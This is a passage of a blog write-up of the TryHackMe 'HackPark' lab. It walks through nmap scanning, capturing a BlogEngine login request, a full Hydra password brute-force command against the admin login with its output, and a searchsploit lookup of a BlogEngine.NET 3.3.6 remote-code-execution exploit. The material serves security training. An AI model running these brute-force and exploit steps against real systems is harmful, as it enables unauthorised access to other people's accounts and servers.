<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.0"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Writeup for TryHackMe room - HackPark" /><meta name="author" content="4n3i5v74" /><meta property="og:locale" content="en_US" /><meta name="description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><meta property="og:description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><link rel="canonical" href="https://4n3i5v74.github.io/posts/tryhackme-hackpark/" /><meta property="og:url" content="https://4n3i5v74.github.io/posts/tryhackme-hackpark/" /><meta property="og:site_name" content="4n3i5v74" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-25T00:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Writeup for TryHackMe room - HackPark" /><meta name="twitter:site" content="@nive1103" /><meta name="twitter:creator" content="@4n3i5v74" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"4n3i5v74"},"headline":"Writeup for TryHackMe room - HackPark","dateModified":"2021-03-25T00:00:00+05:30","datePublished":"2021-03-25T00:00:00+05:30","description":"A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups.","url":"https://4n3i5v74.github.io/posts/tryhackme-hackpark/","mainEntityOfPage":{"@type":"WebPage","@id":"https://4n3i5v74.github.io/posts/tryhackme-hackpark/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>Writeup for TryHackMe room - HackPark | 4n3i5v74</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/local.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/copy-code.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">4n3i5v74</a></div><div class="site-subtitle font-italic">A Security Blog.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG â€º <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/4n3i5v74" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span>Posts</span> <span>Writeup for TryHackMe room - HackPark</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Writeup for TryHackMe room - HackPark</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Mar 25, 2021, 12:00 AM +0530" > Mar 25 <i class="unloaded">2021-03-25T00:00:00+05:30</i> </span> by <span class="author"> 4n3i5v74 </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3199 words">17 min</span></div></div><div class="post-content"><div class="flex-container"> <script src="https://tryhackme.com/badge/34685"></script></div><h2 id="hackpark"><a href="https://tryhackme.com/room/hackpark" target="_blank">HackPark</a></h2><p>This room contains detailed info about <code>rejetto</code> http vulnerability exploitation and privilege escalation methods.</p><p>For complete tryhackme path, refer the <a href="https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/" target="_blank">link</a>.</p><h2 id="tools-used">Tools Used</h2><h3 id="enumeration">Enumeration</h3><ul><li>NMAP<li>ZAP</ul><h3 id="cracking">Cracking</h3><ul><li>Hydra</ul><h3 id="exploitation">Exploitation</h3><ul><li>Msfconsole<li>Msfvenom<li>Netcat<li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS" target="_blank">WinPEAS</a><li>Windows Exploit Suggester</ul><h2 id="task-1---deploy-the-vulnerable-windows-machine">Task 1 - Deploy the vulnerable Windows machine</h2><h3 id="references">References</h3><ul><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-nmap/" target="_blank">NMAP Reference</a></ul><p>Use <code>nmap</code> to enumerate the target machine using <code>nmap -PN -T4 -sS --top-ports 1000 --open --reason &lt;ip&gt;</code></p><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20Nmap%207.60%20(%20https://nmap.org%20)%20at%202021-04-29%2005:11%20BST%0ANmap%20scan%20report%20for%20%3Chostname%3E%20(%3Cip%3E)%0AHost%20is%20up,%20received%20arp-response%20(0.00066s%20latency).%0ANot%20shown:%20998%20filtered%20ports%0AReason:%20998%20no-responses%0ASome%20closed%20ports%20may%20be%20reported%20as%20filtered%20due%20to%20--defeat-rst-ratelimit%0APORT%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20%20REASON%0A80/tcp%20%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20syn-ack%20ttl%20128%0A%7C%20http-methods:%0A%7C_%20%20Potentially%20risky%20methods:%20TRACE%0A%7C%20http-robots.txt:%206%20disallowed%20entries%0A%7C%20/Account/*.*%20/search%20/search.aspx%20/error404.aspx%0A%7C_/archive%20/archive.aspx%0A%7C_http-title:%20hackpark%20%7C%20hackpark%20amusements%0A3389/tcp%20open%20%20ms-wbt-server%20syn-ack%20ttl%20128%0A%7C%20ssl-cert:%20Subject:%20commonName=hackpark%0A%7C%20Not%20valid%20before:%202021-04-28T02:39:21%0A%7C_Not%20valid%20after:%20%202021-10-28T02:39:21%0A%7C_ssl-date:%202021-04-29T04:11:36+00:00;%20-1s%20from%20scanner%20time.%0AMAC%20Address:%2002:1C:C7:70:27:5F%20(Unknown)%0A%0AHost%20script%20results:%0A%7C_clock-skew:%20mean:%20-1s,%20deviation:%200s,%20median:%20-1s%0A%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%208.54%20seconds" type="button"></button></div></div><pre><code>Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-29 05:11 BST
Nmap scan report for &lt;hostname&gt; (&lt;ip&gt;)
Host is up, received arp-response (0.00066s latency).
Not shown: 998 filtered ports
Reason: 998 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 128
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries
| /Account/*.* /search /search.aspx /error404.aspx
|_/archive /archive.aspx
|_http-title: hackpark | hackpark amusements
3389/tcp open  ms-wbt-server syn-ack ttl 128
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2021-04-28T02:39:21
|_Not valid after:  2021-10-28T02:39:21
|_ssl-date: 2021-04-29T04:11:36+00:00; -1s from scanner time.
MAC Address: 02:1C:C7:70:27:5F (Unknown)

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Nmap done: 1 IP address (1 host up) scanned in 8.54 seconds
</code></pre><p>Use <code>firefox</code> and load url <code>http://&lt;ip&gt;</code>. Right click on the page and use <code>View source</code>, which will display image source as <code>http://&lt;ip&gt;/image.axd?picture=/26572c3a-0e51-4a9f-9049-b64e730ca75d.jpg</code>.</p><p>Download the image and use <code>google image search</code> to get the picture info.</p><h2 id="task-2---using-hydra-to-brute-force-a-login">Task 2 - Using Hydra to brute-force a login</h2><h3 id="references-1">References</h3><ul><li><a href="https://www.w3schools.com/tags/ref_httpmethods.asp" target="_blank">HTTP request methods</a><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-hydra" target="_blank">Hydra</a></ul><p>Use <code>ZAP</code> to perform an <code>automated scan</code>. Enable <code>traditional spider</code> and <code>ajax spider with HtmlUnit</code> and start attack to crawl the url.</p><p>There is a directory under the ip, named <code>Account</code> which has <code>POST:login.aspx</code>. Analyse the request <code>url</code> and <code>body</code> sent.</p><p>The request <code>url</code> will be similar to <code>http://&lt;ip&gt;/Account/login.aspx?ReturnURL=%2fadmin%2f</code>.</p><p>The request <code>body</code> will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="__VIEWSTATE=Fh+MZp8Cy8pFZwcHUtu4ghXOPoRgZKcqG5qA5S4yexakkHBwXVaiu75+UI7Wqx4VHyFiWcN+eBja++G22qfdLsxtOu7hudc6LRo0t+WqPTLloLin9hNplx1RK2wzzpZhhCtZcTaPWI60ONPdPqfZERLDA+/NOjOMwqrT7ppZFmwZrtnTc8SDiBKp3k+FWkWDx9bpvuHcCqg0fjFAYBqPQx1dKsQw2FOL8BFGbCff9y7yXFhiwB9MJGdhwpzauqV9KY+/gLzgS6YLS0cJc429INqhS6CayTxe3Ov4qfPC2YhQSkIwaf7BkwCCBkW8gVWI+aEWAPexNRUghR2IygRzK4Qk8++aZga3q+l3FN9Okwmr3MUt&amp;__EVENTVALIDATION=zhjBpvqO5BEqQCJSn/47YkRFFuv5ho/m7SHImFmUgqzs7ko4RMao3Tjw5EsWFbmCdztfsRswoUJqDv+SF2rW3V7fjC4DDKajWEa7IYBvWZOIO8OsUKaDiviAnCbxleGuKxOXGnCa+Xbt28nNxaecmG4/PxDgkc8VTKyeIg5CC4JLOFfI&amp;ctl00$MainContent$LoginUser$UserName=ZAP&amp;ctl00$MainContent$LoginUser$Password=ZAP&amp;ctl00$MainContent$LoginUser$RememberMe=on&amp;ctl00$MainContent$LoginUser$LoginButton=Log+in" type="button"></button></div></div><pre><code>__VIEWSTATE=Fh%2BMZp8Cy8pFZwcHUtu4ghXOPoRgZKcqG5qA5S4yexakkHBwXVaiu75%2BUI7Wqx4VHyFiWcN%2BeBja%2B%2BG22qfdLsxtOu7hudc6LRo0t%2BWqPTLloLin9hNplx1RK2wzzpZhhCtZcTaPWI60ONPdPqfZERLDA%2B%2FNOjOMwqrT7ppZFmwZrtnTc8SDiBKp3k%2BFWkWDx9bpvuHcCqg0fjFAYBqPQx1dKsQw2FOL8BFGbCff9y7yXFhiwB9MJGdhwpzauqV9KY%2B%2FgLzgS6YLS0cJc429INqhS6CayTxe3Ov4qfPC2YhQSkIwaf7BkwCCBkW8gVWI%2BaEWAPexNRUghR2IygRzK4Qk8%2B%2BaZga3q%2Bl3FN9Okwmr3MUt&amp;__EVENTVALIDATION=zhjBpvqO5BEqQCJSn%2F47YkRFFuv5ho%2Fm7SHImFmUgqzs7ko4RMao3Tjw5EsWFbmCdztfsRswoUJqDv%2BSF2rW3V7fjC4DDKajWEa7IYBvWZOIO8OsUKaDiviAnCbxleGuKxOXGnCa%2BXbt28nNxaecmG4%2FPxDgkc8VTKyeIg5CC4JLOFfI&amp;ctl00%24MainContent%24LoginUser%24UserName=ZAP&amp;ctl00%24MainContent%24LoginUser%24Password=ZAP&amp;ctl00%24MainContent%24LoginUser%24RememberMe=on&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
</code></pre><p>Use <code>hydra</code> to crack the password.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="hydra%20-l%20admin%20-P%20/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt%20-t%2016%20%3Cip%3E%20http-post-form%20%22/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=Fh+MZp8Cy8pFZwcHUtu4ghXOPoRgZKcqG5qA5S4yexakkHBwXVaiu75+UI7Wqx4VHyFiWcN+eBja++G22qfdLsxtOu7hudc6LRo0t+WqPTLloLin9hNplx1RK2wzzpZhhCtZcTaPWI60ONPdPqfZERLDA+/NOjOMwqrT7ppZFmwZrtnTc8SDiBKp3k+FWkWDx9bpvuHcCqg0fjFAYBqPQx1dKsQw2FOL8BFGbCff9y7yXFhiwB9MJGdhwpzauqV9KY+/gLzgS6YLS0cJc429INqhS6CayTxe3Ov4qfPC2YhQSkIwaf7BkwCCBkW8gVWI+aEWAPexNRUghR2IygRzK4Qk8++aZga3q+l3FN9Okwmr3MUt&amp;__EVENTVALIDATION=zhjBpvqO5BEqQCJSn/47YkRFFuv5ho/m7SHImFmUgqzs7ko4RMao3Tjw5EsWFbmCdztfsRswoUJqDv+SF2rW3V7fjC4DDKajWEa7IYBvWZOIO8OsUKaDiviAnCbxleGuKxOXGnCa+Xbt28nNxaecmG4/PxDgkc8VTKyeIg5CC4JLOFfI&amp;ctl00$MainContent$LoginUser$UserName=%5EUSER%5E&amp;ctl00$MainContent$LoginUser$Password=%5EPASS%5E&amp;ctl00$MainContent$LoginUser$RememberMe=on&amp;ctl00$MainContent$LoginUser$LoginButton=Log+in:F=Failed%22" type="button"></button></div></div><pre><code>hydra -l admin -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 16 &lt;ip&gt; http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=Fh%2BMZp8Cy8pFZwcHUtu4ghXOPoRgZKcqG5qA5S4yexakkHBwXVaiu75%2BUI7Wqx4VHyFiWcN%2BeBja%2B%2BG22qfdLsxtOu7hudc6LRo0t%2BWqPTLloLin9hNplx1RK2wzzpZhhCtZcTaPWI60ONPdPqfZERLDA%2B%2FNOjOMwqrT7ppZFmwZrtnTc8SDiBKp3k%2BFWkWDx9bpvuHcCqg0fjFAYBqPQx1dKsQw2FOL8BFGbCff9y7yXFhiwB9MJGdhwpzauqV9KY%2B%2FgLzgS6YLS0cJc429INqhS6CayTxe3Ov4qfPC2YhQSkIwaf7BkwCCBkW8gVWI%2BaEWAPexNRUghR2IygRzK4Qk8%2B%2BaZga3q%2Bl3FN9Okwmr3MUt&amp;__EVENTVALIDATION=zhjBpvqO5BEqQCJSn%2F47YkRFFuv5ho%2Fm7SHImFmUgqzs7ko4RMao3Tjw5EsWFbmCdztfsRswoUJqDv%2BSF2rW3V7fjC4DDKajWEa7IYBvWZOIO8OsUKaDiviAnCbxleGuKxOXGnCa%2BXbt28nNxaecmG4%2FPxDgkc8VTKyeIg5CC4JLOFfI&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24RememberMe=on&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Failed"
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Hydra%20(http://www.thc.org/thc-hydra)%20starting%20at%202021-04-29%2005:30:52%0A[DATA]%20max%2016%20tasks%20per%201%20server,%20overall%2016%20tasks,%2014344398%20login%20tries%20(l:1/p:14344398),%20~896525%20tries%20per%20task%0A[DATA]%20attacking%20http-post-form://%3Cip%3E:80//Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=Fh+MZp8Cy8pFZwcHUtu4ghXOPoRgZKcqG5qA5S4yexakkHBwXVaiu75+UI7Wqx4VHyFiWcN+eBja++G22qfdLsxtOu7hudc6LRo0t+WqPTLloLin9hNplx1RK2wzzpZhhCtZcTaPWI60ONPdPqfZERLDA+/NOjOMwqrT7ppZFmwZrtnTc8SDiBKp3k+FWkWDx9bpvuHcCqg0fjFAYBqPQx1dKsQw2FOL8BFGbCff9y7yXFhiwB9MJGdhwpzauqV9KY+/gLzgS6YLS0cJc429INqhS6CayTxe3Ov4qfPC2YhQSkIwaf7BkwCCBkW8gVWI+aEWAPexNRUghR2IygRzK4Qk8++aZga3q+l3FN9Okwmr3MUt&amp;__EVENTVALIDATION=zhjBpvqO5BEqQCJSn/47YkRFFuv5ho/m7SHImFmUgqzs7ko4RMao3Tjw5EsWFbmCdztfsRswoUJqDv+SF2rW3V7fjC4DDKajWEa7IYBvWZOIO8OsUKaDiviAnCbxleGuKxOXGnCa+Xbt28nNxaecmG4/PxDgkc8VTKyeIg5CC4JLOFfI&amp;ctl00$MainContent$LoginUser$UserName=%5EUSER%5E&amp;ctl00$MainContent$LoginUser$Password=%5EPASS%5E&amp;ctl00$MainContent$LoginUser$RememberMe=on&amp;ctl00$MainContent$LoginUser$LoginButton=Log+in:F=Failed%0A[STATUS]%20720.00%20tries/min,%20720%20tries%20in%2000:01h,%2014343678%20to%20do%20in%20332:02h,%2016%20active%0A[80][http-post-form]%20host:%20%3Cip%3E%20%20%20login:%20admin%20%20%20password:%20%3Cpassword%3E%0A1%20of%201%20target%20successfully%20completed,%201%20valid%20password%20found%0AHydra%20(http://www.thc.org/thc-hydra)%20finished%20at%202021-04-29%2005:33:03" type="button"></button></div></div><pre><code>Hydra (http://www.thc.org/thc-hydra) starting at 2021-04-29 05:30:52
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://&lt;ip&gt;:80//Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=Fh%2BMZp8Cy8pFZwcHUtu4ghXOPoRgZKcqG5qA5S4yexakkHBwXVaiu75%2BUI7Wqx4VHyFiWcN%2BeBja%2B%2BG22qfdLsxtOu7hudc6LRo0t%2BWqPTLloLin9hNplx1RK2wzzpZhhCtZcTaPWI60ONPdPqfZERLDA%2B%2FNOjOMwqrT7ppZFmwZrtnTc8SDiBKp3k%2BFWkWDx9bpvuHcCqg0fjFAYBqPQx1dKsQw2FOL8BFGbCff9y7yXFhiwB9MJGdhwpzauqV9KY%2B%2FgLzgS6YLS0cJc429INqhS6CayTxe3Ov4qfPC2YhQSkIwaf7BkwCCBkW8gVWI%2BaEWAPexNRUghR2IygRzK4Qk8%2B%2BaZga3q%2Bl3FN9Okwmr3MUt&amp;__EVENTVALIDATION=zhjBpvqO5BEqQCJSn%2F47YkRFFuv5ho%2Fm7SHImFmUgqzs7ko4RMao3Tjw5EsWFbmCdztfsRswoUJqDv%2BSF2rW3V7fjC4DDKajWEa7IYBvWZOIO8OsUKaDiviAnCbxleGuKxOXGnCa%2BXbt28nNxaecmG4%2FPxDgkc8VTKyeIg5CC4JLOFfI&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24RememberMe=on&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Failed
[STATUS] 720.00 tries/min, 720 tries in 00:01h, 14343678 to do in 332:02h, 16 active
[80][http-post-form] host: &lt;ip&gt;   login: admin   password: &lt;password&gt;
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2021-04-29 05:33:03
</code></pre><h2 id="task-3---compromise-the-machine">Task 3 - Compromise the machine</h2><h3 id="references-2">References</h3><ul><li><a href="https://www.exploit-db.com/exploits/46353" target="_blank">BlogEngine RCE</a><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-searchsploit" target="_blank">Searchsploit ref</a></ul><p>Use <code>firefox</code> to login to url <code>http://&lt;ip&gt;/Account/login.aspx?ReturnURL=/admin/</code> with previously cracked password.</p><p>Use <code>searchsploit</code> to check for any known exploits.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="searchsploit%20%22blogengine%203.3.6%22" type="button"></button></div></div><pre><code>searchsploit "blogengine 3.3.6"
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="-------------------------------------------------------------------%20---------------------------------%0A%20Exploit%20Title%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20%20Path%0A-------------------------------------------------------------------%20---------------------------------%0ABlogEngine.NET%203.3.6%20-%20Directory%20Traversal%20/%20Remote%20Code%20Execution%20%7C%20aspx/webapps/46353.cs%0ABlogEngine.NET%203.3.6/3.3.7%20-%20'dirPath'%20Directory%20Traversal%20/%20Remot%20%7C%20aspx/webapps/47010.py%0ABlogEngine.NET%203.3.6/3.3.7%20-%20'path'%20Directory%20Traversal%20%20%20%20%20%20%20%20%20%20%20%20%7C%20aspx/webapps/47035.py%0ABlogEngine.NET%203.3.6/3.3.7%20-%20'theme%20Cookie'%20Directory%20Traversal%20/%20%20%7C%20aspx/webapps/47011.py%0ABlogEngine.NET%203.3.6/3.3.7%20-%20XML%20External%20Entity%20Injection%20%20%20%20%20%20%20%20%20%7C%20aspx/webapps/47014.py%0A-------------------------------------------------------------------%20---------------------------------%0AShellcodes:%20No%20Results" type="button"></button></div></div><pre><code>------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remot | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal            | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal /  | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection         | aspx/webapps/47014.py
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre><p>Download the <code>RCE</code> expliot script <code>46353.cs</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="%20%20Exploit:%20BlogEngine.NET%203.3.6%20-%20Directory%20Traversal%20/%20Remote%20Code%20Execution%0A%20%20%20%20URL:%20https://www.exploit-db.com/exploits/46353%0A%20%20%20%20Path:%20/opt/searchsploit/exploits/aspx/webapps/46353.cs%0AFile%20Type:%20HTML%20document,%20ASCII%20text,%20with%20CRLF%20line%20terminators%0A%0ACopied%20to:%20/root/Windows-Exploit-Suggester/46353.cs" type="button"></button></div></div><pre><code>  Exploit: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution
    URL: https://www.exploit-db.com/exploits/46353
    Path: /opt/searchsploit/exploits/aspx/webapps/46353.cs
File Type: HTML document, ASCII text, with CRLF line terminators

Copied to: /root/Windows-Exploit-Suggester/46353.cs
